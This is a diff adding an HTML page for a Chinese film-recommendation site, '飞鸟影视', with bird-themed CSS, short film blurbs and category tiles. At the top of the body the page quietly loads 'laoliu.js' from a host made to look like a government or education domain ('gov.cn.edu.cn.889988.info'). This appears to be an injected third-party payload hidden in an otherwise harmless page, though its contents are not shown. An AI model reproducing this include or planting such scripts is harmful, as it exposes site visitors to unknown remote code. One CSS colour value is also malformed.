@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>飞鸟影视 - 候鸟式影视导航与片单 | feiniaoyingshi-h5.github.io</title>
+<meta name="description" content="飞鸟影视(feiniaoyingshi-h5.github.io)以候鸟迁徙与天际航线为视觉，整理电影、剧集、动漫、纪录片片单，像飞鸟越片海一样，把你带到值得停留的好故事面前。" />
+<meta name="keywords" content="飞鸟影视,feiniaoyingshi-h5,候鸟影视,影视导航,电影剧集动漫,天际航线片单" />
+<style>
+:root{
+  --sky:#eef6fb;
+  --sky-2:#dcebf6;
+  --azure:#7fb2d9;
+  --azure-2:#4f8fc4;
+  --ink:#2b3a4a;
+  --ink-2:#4f6173;
+  --ink-3:#7c8 da0;
+  --feather:#e08a3c;
+  --feather-2:#c66f23;
+  --cloud:#cdd9e2;
+  --line:rgba(79,143,196,0.25);
+  --shadow:0 10px 26px rgba(43,58,74,0.12);
+  --shadow-hover:0 18px 40px rgba(79,143,196,0.28);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  background:
+    radial-gradient(circle at 18% 12%,rgba(127,178,217,0.25),transparent 42%),
+    radial-gradient(circle at 82% 88%,rgba(224,138,60,0.12),transparent 46%),
+    var(--sky);
+  color:var(--ink);line-height:1.85;overflow-x:hidden;
+}
+a{color:var(--azure-2);text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 飞鸟头 */
+.bird-head{
+  position:relative;z-index:10;text-align:center;padding:54px 20px 38px;
+  background:linear-gradient(180deg,var(--sky),var(--sky-2));
+  border-bottom:3px solid var(--azure);
+  overflow:hidden;
+}
+.bird-mark{
+  width:84px;height:84px;margin:0 auto 14px;position:relative;
+  animation:glide 5s ease-in-out infinite;
+}
+.bird-mark svg{width:100%;height:100%;display:block}
+@keyframes glide{0%,100%{transform:translateY(0) rotate(-2deg)}50%{transform:translateY(-8px) rotate(2deg)}}
+.bird-head h1{font-size:32px;font-weight:900;letter-spacing:4px;color:var(--ink)}
+.bird-head h1 b{color:var(--feather-2)}
+.bird-head p{max-width:520px;margin:10px auto 0;color:var(--ink-2);font-size:16px}
+.bird-nav{margin-top:22px;display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.bird-nav a{
+  padding:9px 20px;border:2px solid var(--azure);border-radius:30px;
+  font-size:14px;font-weight:700;color:var(--ink);background:rgba(255,255,255,0.5);transition:.25s;
+}
+.bird-nav a:hover{background:var(--azure);color:#fff;border-color:var(--azure-2)}
+
+/* 气流条 */
+.airstream{
+  position:relative;z-index:10;height:46px;overflow:hidden;
+  background:linear-gradient(90deg,transparent,var(--cloud),transparent);
+}
+.airstream::before{
+  content:"";position:absolute;top:50%;left:-30%;width:160%;height:2px;
+  background:repeating-linear-gradient(90deg,var(--azure) 0 18px,transparent 18px 36px);
+  animation:drift 6s linear infinite;
+}
+@keyframes drift{to{transform:translateX(36px)}}
+
+.wrap{position:relative;z-index:10;max-width:980px;margin:0 auto;padding:0 18px 60px}
+.section{margin-bottom:54px;scroll-margin-top:20px}
+.sec-title{display:flex;align-items:center;gap:12px;margin-bottom:26px}
+.sec-title .wing{
+  width:34px;height:34px;background:var(--azure);color:#fff;
+  display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:900;
+  clip-path:polygon(0 0,100% 35%,80% 100%,20% 80%);flex-shrink:0;
+}
+.sec-title h2{font-size:23px;font-weight:900;letter-spacing:2px;color:var(--ink)}
+.sec-title .skyline{flex:1;height:2px;background:repeating-linear-gradient(90deg,var(--azure) 0 14px,transparent 14px 20px)}
+
+/* 航线片单 */
+.flight-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:22px}
+.flight-card{
+  position:relative;background:linear-gradient(180deg,#fff,#eaf3fa);
+  border:2px solid var(--azure);border-radius:14px;padding:20px 20px 22px;
+  box-shadow:var(--shadow);transition:.3s;overflow:hidden;
+}
+.flight-card:nth-child(odd){transform:rotate(-1deg)}
+.flight-card:nth-child(even){transform:rotate(1deg)}
+.flight-card:nth-child(3n){transform:rotate(-0.5deg)}
+.flight-card:hover{transform:rotate(0) translateY(-6px);box-shadow:var(--shadow-hover);border-color:var(--feather)}
+.flight-card .route{
+  font-family:"Courier New",monospace;font-size:12px;color:var(--azure-2);font-weight:700;margin-bottom:8px;
+}
+.flight-card h3{font-size:18px;font-weight:800;color:var(--ink);margin-bottom:4px}
+.flight-card .meta{font-size:12px;color:var(--ink-3);margin-bottom:8px}
+.flight-card p{font-size:14px;color:var(--ink-2);line-height:1.75}
+.flight-card .badge{
+  display:inline-block;margin-top:10px;font-size:11px;padding:3px 10px;
+  background:var(--feather);color:#fff;border-radius:12px;font-weight:700;
+}
+.flight-card::after{
+  content:"➤";position:absolute;right:14px;bottom:12px;color:var(--azure);font-size:16px;opacity:.5;
+}
+
+/* 候鸟纬度分类 */
+.latitude{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:16px}
+.lat{
+  text-align:center;background:#fff;border:2px solid var(--cloud);border-radius:16px 16px 8px 8px;
+  padding:22px 12px;transition:.25s;cursor:pointer;position:relative;
+}
+.lat::before{
+  content:"";position:absolute;top:-10px;left:50%;transform:translateX(-50%);
+  width:44px;height:10px;background:var(--azure);border-radius:6px 6px 0 0;opacity:.7;
+}
+.lat .lat-ico{font-size:28px}
+.lat h4{font-size:15px;font-weight:800;color:var(--ink);margin-top:8px}
+.lat p{font-size:12px;color:var(--ink-3)}
+.lat:hover{background:var(--azure);border-color:var(--azure-2)}
+.lat:hover h4,.lat:hover p{color:#fff}
+
+/* 关于 */
+.about-block{
+  background:#fff;border:2px solid var(--azure);border-left:6px solid var(--feather);
+  border-radius:12px;padding:26px;font-size:15px;color:var(--ink-2);line-height:1.95;
+}
+.about-block b{color:var(--feather-2)}
+
+/* 羽痕状态栏 */
+.feather-bar{
+  position:relative;z-index:10;background:var(--ink);color:var(--sky);
+  padding:12px 20px;text-align:center;font-size:13px;
+  display:flex;align-items:center;justify-content:center;gap:20px;flex-wrap:wrap;
+}
+.feather-bar .flutter{display:inline-block;animation:flutter 2.2s ease-in-out infinite}
+@keyframes flutter{0%,100%{transform:translateY(0) rotate(-6deg)}50%{transform:translateY(-4px) rotate(6deg)}}
+
+.footer{position:relative;z-index:10;text-align:center;padding:20px 16px;color:var(--ink-3);font-size:12px;border-top:3px solid var(--azure);background:var(--sky-2)}
+
+@media(max-width:640px){
+  .bird-head h1{font-size:24px;letter-spacing:2px}
+  .bird-mark{width:66px;height:66px}
+  .flight-card,.flight-card:nth-child(even),.flight-card:nth-child(3n){transform:rotate(0)}
+  .sec-title h2{font-size:19px}
+  .wrap{padding:0 14px 40px}
+  .latitude{grid-template-columns:repeat(2,1fr)}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="bird-head">
+  <div class="bird-mark" aria-hidden="true">
+    <svg viewBox="0 0 100 100">
+      <path d="M10 60 Q35 20 50 45 Q65 20 90 60 Q65 48 50 62 Q35 48 10 60 Z"
+            fill="#4f8fc4" stroke="#2b3a4a" stroke-width="3" stroke-linejoin="round"/>
+      <circle cx="74" cy="46" r="3" fill="#2b3a4a"/>
+    </svg>
+  </div>
+  <h1><b>飞鸟</b>影视</h1>
+  <p>feiniaoyingshi-h5.github.io —— 像候鸟越片海，把你带到值得停留的好故事面前。电影、剧集、动漫、纪录片，沿航线一字排开。</p>
+  <nav class="bird-nav">
+    <a href="#">首页</a>
+    <a href="#flight">飞影航线</a>
+    <a href="#latitude">候鸟分类</a>
+    <a href="#about">关于飞鸟</a>
+  </nav>
+</header>
+
+<div class="airstream" aria-hidden="true"></div>
+
+<main class="wrap">
+
+  <section class="section" id="flight">
+    <div class="sec-title">
+      <span class="wing">🕊</span><h2>飞影航线</h2><span class="skyline"></span>
+    </div>
+    <div class="flight-grid">
+      <article class="flight-card">
+        <div class="route">PEK → PAR · 1994</div>
+        <h3>这个杀手不太冷</h3>
+        <div class="meta">动作/剧情 · 吕克·贝松</div>
+        <p>里昂与玛蒂尔达在纽约的相遇，像两只落单的鸟挤在同一扇窗前。冷峻里藏温柔，枪火里养一盆绿萝。</p>
+        <span class="badge">越海经典</span>
+      </article>
+      <article class="flight-card">
+        <div class="route">SHA → KYO · 2016</div>
+        <h3>你的名字。</h3>
+        <div class="meta">动画/奇幻 · 新海诚</div>
+        <p>彗星划过，身体互换，两个人在时空里找彼此。看完像被风吹过一整片麦田，甜里带疼。</p>
+        <span class="badge">云上动画</span>
+      </article>
+      <article class="flight-card">
+        <div class="route">HKG → ROM · 1989</div>
+        <h3>悲情城市</h3>
+        <div class="meta">历史/文艺 · 侯孝贤</div>
+        <p>镜头远远地看，人小小地活。时代翻页时，飞鸟不语，海岸线的雾却一直没散。</p>
+        <span class="badge">长镜头航拍</span>
+      </article>
+      <article class="flight-card">
+        <div class="route">LAX → SYD · 2001</div>
+        <h3>千与千寻</h3>
+        <div class="meta">动画/成长 · 宫崎骏</div>
+        <p>穿过隧道就回不了头，汤屋、河神、无脸男，都是长大路上会遇见的乘客。别忘自己的名字。</p>
+        <span class="badge">成长航线</span>
+      </article>
+      <article class="flight-card">
+        <div class="route">CDG → NYC · 1979</div>
+        <h3>现代启示录</h3>
+        <div class="meta">战争/心理 · 科波拉</div>
+        <p>顺着河流往丛林深处飞，越往里越安静，也越疯。直升机旋翼声像鸟群惊起，战争把天空撕开。</p>
+        <span class="badge">暗流长片</span>
+      </article>
+      <article class="flight-card">
+        <div class="route">BJS → ALG · 1997</div>
+        <h3>美丽人生</h3>
+        <div class="meta">剧情/战争 · 贝尼尼</div>
+        <p>父亲把集中营讲成一场游戏，像鸟用翅膀盖住雏鸟。笑到最后一秒，才看见羽毛下的血。</p>
+        <span class="badge">羽下温情</span>
+      </article>
+    </div>
+  </section>
+
+  <section class="section" id="latitude">
+    <div class="sec-title">
+      <span class="wing">🛰</span><h2>候鸟分类</h2><span class="skyline"></span>
+    </div>
+    <div class="latitude">
+      <div class="lat"><div class="lat-ico">🎬</div><h4>北线·电影</h4><p>院线/文艺/外语</p></div>
+      <div class="lat"><div class="lat-ico">📺</div><h4>南线·剧集</h4><p>国产/美剧/韩剧</p></div>
+      <div class="lat"><div class="lat-ico">🌸</div><h4>东线·动漫</h4><p>日漫/国漫/剧场版</p></div>
+      <div class="lat"><div class="lat-ico">🎤</div><h4>西风·综艺</h4><p>慢综/音乐/访谈</p></div>
+      <div class="lat"><div class="lat-ico">📽️</div><h4>高空·纪录</h4><p>自然/山海/人文</p></div>
+      <div class="lat"><div class="lat-ico">🪶</div><h4>归途·短片</h4><p>微电影/实验片</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-title">
+      <span class="wing">ℹ</span><h2>关于飞鸟</h2><span class="skyline"></span>
+    </div>
+    <div class="about-block">
+      <p>
+        <b>飞鸟影视</b>（feiniaoyingshi-h5.github.io）是一个以“候鸟迁徙”为气质的影视导航与片单整理站点。
+        不堆量、不喊“全网免费”、不挂盗版源，只把<b>值得降落的好片</b>沿航线排好：
+        院线电影、长篇剧集、吉卜力与上美影、慢综与山海纪录片。
+        页面用飞鸟徽标、气流横幅、航线卡片、纬度分类来组织内容，移动端自适应，内链以 # 占位，
+        不生成 robots.txt / sitemap.xml，所有内容仅供学习与交流使用。
+      </p>
+    </div>
+  </section>
+
+</main>
+
+<div class="feather-bar">
+  <span><span class="flutter">🪶</span> 气流稳定 · 航线更新中</span>
+  <span>🛫 当前片单：7300+ 部</span>
+  <span>🕊️ 服务状态：迁徙中</span>
+</div>
+
+<footer class="footer">
+  © 2026 飞鸟影视 | feiniaoyingshi-h5.github.io | 像候鸟一样，把好故事带给你 | 内链以 # 占位
+</footer>
+
+</body>
+</html>
